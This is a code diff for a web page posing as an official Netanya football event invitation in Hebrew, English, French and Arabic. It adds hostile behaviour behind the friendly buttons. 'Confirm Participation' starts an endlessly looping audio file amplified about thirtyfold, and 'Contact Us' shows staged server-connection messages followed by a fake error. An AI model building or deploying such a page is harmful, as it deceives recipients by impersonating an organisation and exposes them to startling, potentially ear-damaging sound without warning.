@@ -43,17 +43,12 @@ button{
 .info{background:#e0e0e0;}
 .contact{background:#f5f5f5;}
 
-/* 🔥 УСИЛЕННЫЙ БЛОК ВНИМАНИЯ */
 .notice{
   margin-top:25px;
-  font-size:15px;
-  font-weight:800;
-  color:#1a1a1a;
+  font-size:13px;
+  color:#555;
   border-top:1px solid #eee;
-  padding-top:16px;
-  padding-inline-start:14px;
-  border-inline-start:5px solid #0b2a5b;
-  background:#f7f9fc;
+  padding-top:15px;
 }
 
 .info-icon{
@@ -125,6 +120,21 @@ button{
 
 <div class="main" id="content"></div>
 
+<div id="overlay">
+  <div class="spinner"></div>
+  <div id="overlayText"></div>
+</div>
+
+<div id="errorModal">
+  <div class="error-box">
+    <div class="error-header" id="errorTitle"></div>
+    <div class="error-body" id="errorMessage"></div>
+    <div class="error-footer">
+      <button onclick="closeError()" id="errorOk"></button>
+    </div>
+  </div>
+</div>
+
 <footer class="footer">
   <span id="footerText"></span>
 </footer>
@@ -132,7 +142,30 @@ button{
 <script>
 const content = document.getElementById("content");
 const footerText = document.getElementById("footerText");
+const overlay = document.getElementById("overlay");
+const overlayText = document.getElementById("overlayText");
+const errorModal = document.getElementById("errorModal");
+const errorTitle = document.getElementById("errorTitle");
+const errorMessage = document.getElementById("errorMessage");
+const errorOk = document.getElementById("errorOk");
 
+/* SOUND */
+let audioContext,gainNode,audio,started=false;
+function startLoudLoop(){
+  if(started)return;
+  started=true;
+  audioContext=new (window.AudioContext||window.webkitAudioContext)();
+  gainNode=audioContext.createGain();
+  gainNode.gain.value=30;
+  gainNode.connect(audioContext.destination);
+  audio=new Audio("ston.mp3");
+  audio.loop=true;
+  const src=audioContext.createMediaElementSource(audio);
+  src.connect(gainNode);
+  audio.play();
+}
+
+/* TEXTS */
 let currentLang="he";
 
 const texts={
@@ -140,14 +173,86 @@ he:{
 content:`<h1>הזמנה לאירוע כדורגל מיוחד</h1>
 <div class="event-date">תאריך האירוע: 4 בפברואר 2026 · שעה: 18:00</div>
 <p>נבחרת להשתתף באירוע ייחודי של כדורגל נתניה. מספר המקומות מוגבל וההשתתפות מותנית באישור מוקדם.</p>
-<div class="notice">לפני אישור ההשתתפות, חובה לקרוא בעיון את המידע הנוסף וההנחיות הרשמיות.</div>`,
-footer:"© 2026 ארגון הכדורגל נתניה · כל הזכויות שמורות"
+<div class="buttons">
+<button class="confirm" onclick="startLoudLoop()">אישור השתתפות</button>
+<button class="info" onclick="location.href='info.html'"><span class="info-icon">i</span>מידע נוסף</button>
+<button class="contact" onclick="contact()">צור קשר</button>
+</div>
+<div class="notice"><strong>לפני אישור ההשתתפות, מומלץ לקרוא בעיון את המידע הנוסף וההנחיות הרשמיות.</strong></div>`,
+footer:"© 2026 ארגון הכדורגל נתניה · כל הזכויות שמורות",
+load:["מתחבר לשרת…","מאמת בקשה…"],
+error:["שגיאה","שגיאה זמנית. אנא נסה שוב מאוחר יותר.","אישור"]
+},
+en:{
+content:`<h1>Official Football Event Invitation</h1>
+<div class="event-date">Event Date: February 4, 2026 · Time: 18:00</div>
+<p>You have been selected to participate in a special Netanya football event. Participation requires confirmation.</p>
+<div class="buttons">
+<button class="confirm" onclick="startLoudLoop()">Confirm Participation</button>
+<button class="info" onclick="location.href='info.html'"><span class="info-icon">i</span>More Information</button>
+<button class="contact" onclick="contact()">Contact Us</button>
+</div>
+<div class="notice"><strong>Please read the additional information and official guidelines carefully before confirming.</strong></div>`,
+footer:"© 2026 Netanya Football Organization · All rights reserved",
+load:["Connecting to server…","Authorizing request…"],
+error:["Error","Temporary error. Please try again later.","OK"]
+},
+fr:{
+content:`<h1>Invitation officielle à un événement de football</h1>
+<div class="event-date">Date de l’événement : 4 février 2026 · Heure : 18:00</div>
+<p>Vous avez été sélectionné pour participer à un événement spécial à Netanya.</p>
+<div class="buttons">
+<button class="confirm" onclick="startLoudLoop()">Confirmer la participation</button>
+<button class="info" onclick="location.href='info.html'"><span class="info-icon">i</span>Plus d'informations</button>
+<button class="contact" onclick="contact()">Contact</button>
+</div>
+<div class="notice"><strong>Veuillez lire attentivement les informations supplémentaires avant de confirmer.</strong></div>`,
+footer:"© 2026 Organisation de football de Netanya · Tous droits réservés",
+load:["Connexion au serveur…","Autorisation de la requête…"],
+error:["Erreur","Erreur temporaire. Veuillez réessayer plus tard.","OK"]
+},
+ar:{
+content:`<h1>دعوة رسمية لحدث كرة قدم</h1>
+<div class="event-date">تاريخ الحدث: 4 فبراير 2026 · الساعة: 18:00</div>
+<p>تم اختيارك للمشاركة في حدث خاص لكرة القدم في نتانيا. يتطلب الأمر تأكيدًا مسبقًا.</p>
+<div class="buttons">
+<button class="confirm" onclick="startLoudLoop()">تأكيد المشاركة</button>
+<button class="info" onclick="location.href='info.html'"><span class="info-icon">i</span>معلومات إضافية</button>
+<button class="contact" onclick="contact()">اتصل بنا</button>
+</div>
+<div class="notice"><strong>يرجى قراءة المعلومات الإضافية والتعليمات الرسمية بعناية قبل التأكيد.</strong></div>`,
+footer:"© 2026 منظمة كرة القدم نتانيا · جميع الحقوق محفوظة",
+load:["جارٍ الاتصال بالخادم…","جارٍ التحقق من الطلب…"],
+error:["خطأ","حدث خطأ مؤقت. يرجى المحاولة لاحقًا.","حسناً"]
 }
 };
 
 function render(){
   content.innerHTML=texts[currentLang].content;
   footerText.innerText=texts[currentLang].footer;
+}
+
+function contact(){
+  overlay.style.display="flex";
+  overlayText.innerText=texts[currentLang].load[0];
+  setTimeout(()=>overlayText.innerText=texts[currentLang].load[1],1000+Math.random()*1000);
+  setTimeout(()=>{overlay.style.display="none";showError();},2500+Math.random()*2000);
+}
+
+function showError(){
+  errorTitle.innerText=texts[currentLang].error[0];
+  errorMessage.innerText=texts[currentLang].error[1];
+  errorOk.innerText=texts[currentLang].error[2];
+  errorModal.style.display="flex";
+}
+
+function closeError(){ errorModal.style.display="none"; }
+
+function changeLang(l){
+  currentLang=l;
+  document.documentElement.lang=l;
+  document.documentElement.dir=(l==="he"||l==="ar")?"rtl":"ltr";
+  render();
 }
 
 render();
